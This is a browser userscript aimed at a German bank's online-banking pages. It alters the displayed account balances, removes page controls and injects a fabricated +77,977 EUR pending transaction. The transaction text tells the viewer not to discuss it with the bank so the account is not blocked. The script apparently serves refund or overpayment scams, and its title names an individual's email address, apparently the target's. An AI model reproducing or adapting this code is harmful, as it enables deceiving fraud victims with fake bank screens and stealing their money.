// ==UserScript==
// @name         Ed 4Rec  targ.stefanschreck86@t-online.de
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/530277/Ed%204Rec%20%20targstefanschreck86%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/530277/Ed%204Rec%20%20targstefanschreck86%40t-onlinede.meta.js
// ==/UserScript==


//CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++



//=======================================================================================================================================================================================================================
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------

        // Configurable elements
        var applyUniformAdjustment = false; // Set to true to apply the same adjustment amount to all balances
        var uniformAdjustmentValue = 0.0; // The adjustment amount to use if "applyUniformAdjustment" is true
        var pageTargetText = "Alle Konten anzeigen"; // The text to check if the target page is loaded

        // Configuration for individual balance modifications
        var balanceAdjustmentConfigs = [
            { index: 0, adjustmentValue: 0.50 },
            { index: 2, adjustmentValue: 0.70 },
            { index: 3, adjustmentValue: 0.90 },
            { index: 4, adjustmentValue: 0.90 },
            // Add more configurations as needed
        ];
//=======================================================================================================================================================================================================================



//=======================================================================================================================================================================================================================
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------

    // Configurable elements
    var badjustmentAmount = 0.0; // Modify this value based on your requirement
    var associatedText = '5310566701 PLUS-KONTO'; // Modify this value based on the associated text for your balance

    // Configuration for "gesamt" balance modification
    var gesamtAdjustmentAmount = 0.0; // Modify this value based on your requirement
    var gesamtAssociatedText = 'Gesamt'; // Modify this value based on the associated text for "gesamt" balance
//=======================================================================================================================================================================================================================





//=======================================================================================================================================================================================================================
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------------

    // Configurable elements
        var targetDigits = "5310566701 PLUS-KONTO";
        var useSameBalanceAdjustment = true; // Set to true to use the same adjustment amount for all balances
        var balanceAdjustmentAmount = 0.0; // The adjustment amount to use if "useSameBalanceAdjustment" is true

        // Configuration for individual balance modifications
        var BALANCE_CONFIGSUM = [
            { index: 0, individualBalanceAdjustmentAmount: 0.50 },
            { index: 2, individualBalanceAdjustmentAmount: 0.70 },
            { index: 3, individualBalanceAdjustmentAmount: 0.90 },
             { index: 4, individualBalanceAdjustmentAmount: 0.90 }
            // Add more configurations as needed
        ];

        var aktuellerKontostandText = "Aktueller Kontostand";
//=======================================================================================================================================================================================================================



//=======================================================================================================================================================================================================================
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------



// Check if the page contains the specified digits in the target text
//    var targetDigits = "538992";


    // Manually configure the transactions with an "order" property
    var transactions = [
        {
            order: 5, // Order of processing (1 for first, 2 for second, etc. from bottom)
            transactionDate: 'Vorgemerkt',
            transactionTitle: 'Treuhand: JP Morgan Chase. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
            transactionAmount: '+77.977,00 EUR',
            movingDirection: 'down', // 'up' or 'down'
            numberOfSteps: 0 // Number of steps to move (positive integer)
        },
   //          {
   //         order: 4, // Order of processing (1 for first, 2 for second, etc. from bottom)
   //         transactionDate: '16.10.2024',
   ////         transactionTitle: 'JP Morgan Chase. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
   ////         transactionAmount: '+7.700,00 EUR',
    //        movingDirection: 'down', // 'up' or 'down'
   //         numberOfSteps: 0 // Number of steps to move (positive integer)
   //     },
 //       {
 //           order: 1, // Order of processing (1 for first, 2 for second, etc.)
 //           transactionDate: '10.10.2024',
 //           transactionTitle: 'John Doe',
 //           transactionAmount: '+50,00 EUR',
 //           movingDirection: 'up', // 'up' or 'down'
 //           numberOfSteps: 2 // Number of steps to move (positive integer)
  //      }
        // Add more transactions with their order as needed
    ];
//=======================================================================================================================================================================================================================




//+++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE+++++++
//=======================================================================================================================================================================================================================
//CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++
//=======================================================================================================================================================================================================================
//+++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE+++++++



//=======================================================================================================================================================================================================================
//=======================================================================================================================================================================================================================
//=======================================================================================================================================================================================================================



// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------


//=======================================================================================================================================================================================================================




if (window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("Downloads") > 0) {

    (function() {
        'use strict';

        // Configurable elements
//        var applyUniformAdjustment = true; // Set to true to apply the same adjustment amount to all balances
//        var uniformAdjustmentValue = -2000.0; // The adjustment amount to use if "applyUniformAdjustment" is true
//        var pageTargetText = "Alle Konten anzeigen"; // The text to check if the target page is loaded

        // Configuration for individual balance modifications
//        var balanceAdjustmentConfigs = [
//            { index: 0, adjustmentValue: 3000.50 },
//            { index: 2, adjustmentValue: 3000.70 },
 //           { index: 3, adjustmentValue: 3000.90 },
 //           // Add more configurations as needed
 //       ];

        // Function to check if the target text is present on the page
        function isTextPresent(text) {
            return document.body.textContent.includes(text);
        }

        // Function to modify the balance
        function modifyBalance(balanceElement, adjustmentValue) {
            // Check if the balance element is found
            if (balanceElement) {
                // Extract the current balance text
                var currentBalanceText = balanceElement.textContent.trim();

                // Extract the numeric value from the balance text (handle thousands and decimal separators)
                var currentBalance = parseFloat(currentBalanceText.replace(/[^\d,-]/g, '').replace('.', '').replace(',', '.'));

                // Check if the current balance is a valid number
                if (!isNaN(currentBalance)) {
                    // Calculate the new balance
                    var newBalance = currentBalance + adjustmentValue;

                    // Determine the new class based on the sign of the new balance
                    var newClass = newBalance < 0 ? 'd ei_sdsf_montant _c1 neg _c1' : 'd ei_sdsf_montant _c1 pos _c1';

                    // Format the new balance properly (using '.' as thousand separator and ',' as decimal separator)
                    var updatedBalanceText = formatBalance(newBalance);

                    balanceElement.textContent = updatedBalanceText;
                    balanceElement.className = newClass;

                    console.log(`Account balance modified by ${adjustmentValue.toFixed(2)}. New balance: ${updatedBalanceText}`);
                } else {
                    console.error('Failed to extract a valid balance from the page.');
                }
            } else {
                console.error('Balance element not found on the page.');
            }
        }

        // Function to format the balance with '.' as thousands separator and ',' as decimal separator
        function formatBalance(amount) {
            // Convert number to fixed decimal format
            var parts = amount.toFixed(2).split('.');
            // Insert thousand separators
            parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, '.');
            // Join the parts with the correct decimal separator
            return parts.join(',') + ' EUR';
        }

        // Function to initialize the balance modifications
        function initializeBalanceModifications() {
            // Check if the page contains the specified text
            if (isTextPresent(pageTargetText)) {
                // Find the elements with the account balance class
                var balanceElements = document.querySelectorAll('.d.ei_sdsf_montant._c1.pos._c1, .d.ei_sdsf_montant._c1.neg._c1');

                // Check if any balance elements are found
                if (balanceElements.length > 0) {
                    if (applyUniformAdjustment) {
                        // Use the same adjustment amount for all balances
                        balanceAdjustmentConfigs.forEach(function(config) {
                            modifyBalance(balanceElements[config.index], uniformAdjustmentValue);
                        });
                    } else {
                        // Use individual adjustment amounts for each balance
                        balanceAdjustmentConfigs.forEach(function(config) {
                            modifyBalance(balanceElements[config.index], config.adjustmentValue);
                        });
                    }
                } else {
                    console.error('No balance elements found on the page. Retrying...');
                    setTimeout(initializeBalanceModifications, 1); // Retry after 1 millisecond
                }
            } else {
                console.error(`Text "${pageTargetText}" not found on the page. Retrying...`);
                setTimeout(initializeBalanceModifications, 1); // Retry after 1 millisecond
            }
        }

        // Initialize balance modifications on page load
        initializeBalanceModifications();
    })();
}
//=======================================================================================================================================================================================================================

//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------

//=======================================================================================================================================================================================================================






//===========================================================================================================================================================================================================================


// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("comptes-et-contrats") > 0 || window.location.href.indexOf("comptes-et-contrats") > 0 || window.location.href.indexOf("Downloads") > 0) {

(function() {
    'use strict';

//    // Configurable elements
//   var badjustmentAmount = -2000.0; // Modify this value based on your requirement
//    var associatedText = '538XXXX992'; // Modify this value based on the associated text for your balance

//    // Configuration for "gesamt" balance modification
//    var gesamtAdjustmentAmount = -1000.0; // Modify this value based on your requirement
 //   var gesamtAssociatedText = 'Gesamt'; // Modify this value based on the associated text for "gesamt" balance

    // Function to modify the balance
    function modifyBalance(balanceElement, badjustmentAmount, associatedText) {
        // Check if the balance element is found
        if (balanceElement) {
            // Extract the current balance text
            var currentBalanceText = balanceElement.textContent.trim();

            // Extract the numeric value from the balance text
            var currentBalance = parseFloat(currentBalanceText.replace(/[^\d\,-]/g, '').replace(',', '.'));

            // Check if the current balance is a valid number
            if (!isNaN(currentBalance)) {
                // Check for the associated text content in the same <tr> tag
                var trElement = balanceElement.closest('tr');
                if (trElement && trElement.textContent.includes(associatedText)) {
                    // Calculate the new balance
                    var newBalance = currentBalance + badjustmentAmount;

                    // Determine the new class based on the sign of the new balance
                    var newClass = newBalance < 0 ? 'ei_sdsf_montant _c1 neg _c1' : 'ei_sdsf_montant _c1 pos _c1';

                    // Update the balance element with the new value and class
                    var updatedBalanceText = formatBalance(newBalance);

                    // Remove the first sign if there are two signs before the balance
                    updatedBalanceText = updatedBalanceText.replace(/^(\+|\-){1}(\+|\-)/, '$2');

                    balanceElement.textContent = updatedBalanceText;
                    balanceElement.className = newClass;

                    console.log(`Account balance modified by ${badjustmentAmount.toFixed(2)}. New balance: ${newBalance.toFixed(2)}`);
                } else {
                    console.log(`Associated text "${associatedText}" not found under the same <tr> tag. Skipping modification.`);
                }
            } else {
                console.error('Failed to extract a valid balance from the page.');
            }
        } else {
            console.error('Balance element not found on the page.');
        }
    }

    // Function to format the balance with thousands separator and decimal separator
    function formatBalance(balance) {
        return balance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';
    }

    // Remove the element with class "a_actions"
    var actionsElement = document.querySelector('.a_actions');
    if (actionsElement) {
        actionsElement.remove();
        console.log('Element with class "a_actions" removed.');
    }

    // Find the elements with positive and negative balances
    var positiveBalanceElement = document.querySelector('.ei_sdsf_montant._c1.pos._c1');
    var negativeBalanceElement = document.querySelector('.ei_sdsf_montant._c1.neg._c1');

    // Modify the positive balance
    modifyBalance(positiveBalanceElement, badjustmentAmount, associatedText);

    // Modify the negative balance
    modifyBalance(negativeBalanceElement, badjustmentAmount, associatedText);

    // Find the elements with "gesamt" balances
    var gesamtPositiveBalanceElement = document.querySelector('.ei_sdsf_montant.nowrap._c1.pos._c1');
    var gesamtNegativeBalanceElement = document.querySelector('.ei_sdsf_montant.nowrap._c1.neg._c1');

    // Modify the "gesamt" positive balance
    modifyBalance(gesamtPositiveBalanceElement, gesamtAdjustmentAmount, gesamtAssociatedText);

    // Modify the "gesamt" negative balance
    modifyBalance(gesamtNegativeBalanceElement, gesamtAdjustmentAmount, gesamtAssociatedText);
})();
}





//=======================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------



//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------

//========================================================================================================================================================================================================================






//===========================================================================================================================================================================================================================


// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("Downloads") > 0) {
    (function() {
        'use strict';

   //     // Configurable elements
   //     var targetDigits = "531123";
   //     var useSameBalanceAdjustment = true; // Set to true to use the same adjustment amount for all balances
   //     var balanceAdjustmentAmount = 7700.0; // The adjustment amount to use if "useSameBalanceAdjustment" is true

  //      // Configuration for individual balance modifications
  //      var BALANCE_CONFIGSUM = [
  //          { index: 0, individualBalanceAdjustmentAmount: 3000.50 },
  //          { index: 2, individualBalanceAdjustmentAmount: 3000.70 },
 //           { index: 3, individualBalanceAdjustmentAmount: 3000.90 },
            // Add more configurations as needed
  //      ];

   //     var aktuellerKontostandText = "Aktueller Kontostand";

        // Function to check if the target text contains the specified digits
        function containsDigits(text, digits) {
            return digits.split('').every(digit => text.includes(digit));
        }

        // Check if the page contains the specified digits in the target text
        if (!containsDigits(document.body.textContent, targetDigits)) {
            console.error(`Digits "${targetDigits}" not found in the target text on the page. Aborting script.`);
            return;
        }

        // Check if the page contains the text "Aktueller Kontostand"
        if (!document.body.textContent.includes(aktuellerKontostandText)) {
            console.error(`Text "${aktuellerKontostandText}" not found on the page. Aborting script.`);
            return;
        }

        // Find the elements with the account balance class
        var balanceElements = document.querySelectorAll('._c1.nowrap._c1, ._c1.nowrap._c1.neg');

        // Check if any balance elements are found
        if (balanceElements.length > 0) {
            if (useSameBalanceAdjustment) {
                // Use the same adjustment amount for all balances
                BALANCE_CONFIGSUM.forEach(function(config) {
                    modifyBalance(balanceElements[config.index], balanceAdjustmentAmount);
                });
            } else {
                // Use individual adjustment amounts for each balance
                BALANCE_CONFIGSUM.forEach(function(config) {
                    modifyBalance(balanceElements[config.index], config.individualBalanceAdjustmentAmount);
                });
            }
        } else {
            console.error('No balance elements found on the page.');
        }

        // Function to modify the balance
        function modifyBalance(balanceElement, adjustmentAmount) {
            // Check if the balance element is found
            if (balanceElement) {
                // Extract the current balance text
                var currentBalanceText = balanceElement.textContent.trim();

                // Extract the numeric value from the balance text
                var currentBalance = parseBalance(currentBalanceText);

                // Check if the current balance is a valid number
                if (!isNaN(currentBalance)) {
                    // Calculate the new balance
                    var newBalance = currentBalance + adjustmentAmount;

                    // Determine the new class based on the sign of the new balance
                    var newClass = newBalance < 0 ? '_c1.nowrap._c1.neg' : '_c1.nowrap._c1';

                    // Format the new balance and update the element
                    var updatedBalanceText = formatBalance(newBalance);
                    balanceElement.textContent = updatedBalanceText;
                    balanceElement.className = newClass;

                    console.log(`Account balance modified by ${adjustmentAmount.toFixed(2)}. New balance: ${newBalance.toFixed(2)}`);
                } else {
                    console.error('Failed to extract a valid balance from the page.');
                }
            } else {
                console.error('Balance element not found on the page.');
            }
        }

        // Function to parse a balance from text (e.g., "+9.667,16 EUR" -> 9667.16)
        function parseBalance(balanceText) {
            // Remove currency and non-numeric characters except for minus sign, dots, and commas
            var numericText = balanceText.replace(/[^\d,-]/g, '');

            // Replace dots (thousands separators) with nothing, and commas (decimal separators) with dots
            numericText = numericText.replace(/\./g, '').replace(',', '.');

            // Parse as a float
            return parseFloat(numericText);
        }

        // Function to format a number back into the balance format (e.g., 9667.16 -> "9.667,16 EUR")
        function formatBalance(balance) {
            // Convert the balance to a string with 2 decimal places
            var balanceText = balance.toFixed(2);

            // Replace the dot with a comma for decimal separator
            balanceText = balanceText.replace('.', ',');

            // Insert thousands separators (dot) where appropriate
            balanceText = balanceText.replace(/\B(?=(\d{3})+(?!\d))/g, '.');

            // Add the currency back (e.g., " EUR")
            return balance >= 0 ? `+${balanceText} EUR` : `${balanceText} EUR`;
        }
    })();
}

//===========================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


//===========================================================================================================================================================================================================================




//===========================================================================================================================================================================================================================


// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------


//===========================================================================================================================================================================================================================




if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("Downloads") > 0) {

(function() {
    'use strict';

    // Function to check if the target text contains the specified digits
    function containsDigits(text, digits) {
        return digits.split('').every(digit => text.includes(digit));
    }

//    // Check if the page contains the specified digits in the target text
 //  var targetDigits = "531XXXX123 PLUS-KONTO";
    if (!containsDigits(document.body.textContent, targetDigits)) {
        console.error(`Digits "${targetDigits}" not found in the target text on the page. Aborting script.`);
        return;
    }

//    // Manually configure the transactions with an "order" property
 //   var transactions = [
 //       {
  //          order: 2, // Order of processing (1 for first, 2 for second, etc.)
  //          transactionDate: '13.12.2023',
  //          transactionTitle: 'Marlene Friedrichs und Hans Friedrichs',
   //         transactionAmount: '+100,00 EUR',
   //         movingDirection: 'down', // 'up' or 'down'
   //         numberOfSteps: 0 // Number of steps to move (positive integer)
   //     },
//        {
//            order: 1, // Order of processing (1 for first, 2 for second, etc.)
//            transactionDate: '14.12.2023',
//            transactionTitle: 'John Doe',
//            transactionAmount: '+50,00 EUR',
//            movingDirection: 'up', // 'up' or 'down'
//            numberOfSteps: 2 // Number of steps to move (positive integer)
//        }
//        // Add more transactions with their order as needed
 //   ];

    // Sort transactions by their processing order
    transactions.sort(function(a, b) {
        return a.order - b.order;
    });

    // Function to insert a transaction
    function insertTransaction(transaction) {
        // Determine the transaction amount class based on its sign
        var transactionAmountClass = transaction.transactionAmount.startsWith('-') ? '_c1 neg _c1' : '_c1 pos _c1';

        // Create the transaction HTML
        var transactionHtml = `
        <tr>
            <td class="h c nowrap eir_hidexs _c1 ${transactionAmountClass === '_c1 neg' ? 'i' : 'p'}">${transaction.transactionDate}</td>
            <td class="g ei_decal1 _c1 ${transactionAmountClass === '_c1 neg' ? 'i' : 'p'}">
                <div class="_c1 fd d">
                    <a id="I0:d2.D:A:ub.ut.F6_0.F7_2.F8_0.A9" href="#">Details</a>
                </div>
                <span class="eir_showxs sf-hidden">${transaction.transactionDate}</span>
                ${transaction.transactionTitle}
                <p class="_c1 d eir_showxs ${transactionAmountClass} sf-hidden">${transaction.transactionAmount}</p>
            </td>
            <td class="d nowrap h eir_hidexs _c1 ${transactionAmountClass === '_c1 neg' ? 'i' : 'p'}"></td>
            <td class="d nowrap h eir_hidexs _c1 ${transactionAmountClass === '_c1 neg' ? 'i' : 'p'}">
                <span class="${transactionAmountClass}">${transaction.transactionAmount}</span>
            </td>
        </tr>
    `;

        // Find the second <tbody> element on the page
        var tbodyElements = document.querySelectorAll('tbody');
        if (tbodyElements.length >= 2) {
            var secondTbody = tbodyElements[1];

            // Insert the transaction HTML as the first child of the second <tbody> element
            secondTbody.insertAdjacentHTML('afterbegin', transactionHtml);

            // Move the transaction up or down
            if (transaction.movingDirection === 'up') {
                for (var i = 0; i < transaction.numberOfSteps; i++) {
                    var transactionRow = secondTbody.querySelector('tr');
                    if (transactionRow) {
                        var previousSibling = transactionRow.previousElementSibling;
                        if (previousSibling) {
                            previousSibling.insertAdjacentElement('beforebegin', transactionRow);
                        }
                    }
                }
            } else if (transaction.movingDirection === 'down') {
                for (var i = 0; i < transaction.numberOfSteps; i++) {
                    var transactionRow = secondTbody.querySelector('tr');
                    if (transactionRow) {
                        var nextSibling = transactionRow.nextElementSibling;
                        if (nextSibling) {
                            nextSibling.insertAdjacentElement('afterend', transactionRow);
                        }
                    }
                }
            }

            console.log(`Transaction inserted and moved ${transaction.numberOfSteps} step(s) ${transaction.movingDirection}.`);
        } else {
            console.error('Not enough <tbody> elements found on the page.');
        }
    }

    // Process transactions in the defined order
    transactions.forEach(function(transaction) {
        insertTransaction(transaction);
    });
})();
 }

//===========================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


//===========================================================================================================================================================================================================================









//===========================================================================================================================================================================================================================


// TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY---------------------------------TARGO START UTILITY---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------TARGO START UTILITY---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY---------------------------------TARGO START UTILITY---------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("pageaccueil") > 0 || window.location.href.indexOf("pageaccueil") > 0 || window.location.href.indexOf("Downloads") > 0) {


(function() {
    'use strict';

    // Function to remove the second element with role="group"
    function removeSecondGroupElement() {
        // Remove the second element with role="group" directly on page load
        var groupElements = document.querySelectorAll('[role="group"]');
        if (groupElements.length > 1) {
            groupElements[1].remove();
            console.log('Second element with role="group" removed on page load.');
        }

        // Create a MutationObserver instance
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(addedNode) {
                    // Check if the added node is an element with role="group"
                    if (addedNode instanceof Element && addedNode.getAttribute('role') === 'group') {
                        // Check if it is the second element with role="group"
                        var updatedGroupElements = document.querySelectorAll('[role="group"]');
                        if (updatedGroupElements.length > 1) {
                            // Remove the second element with role="group"
                            updatedGroupElements[1].remove();
                            console.log('Second element with role="group" removed.');
                        }
                    }
                });
            });
        });

        // Options for the observer
        var config = { childList: true, subtree: true };

        // Start observing the target node for configured mutations
        observer.observe(document.body, config);
    }

    // Call the function to remove the second element with role="group"
    removeSecondGroupElement();
})();
 }








//=========================================================================================================================================================================================================================================


// TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY---------------------------------TARGO UMSAETZE UTILITY---------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
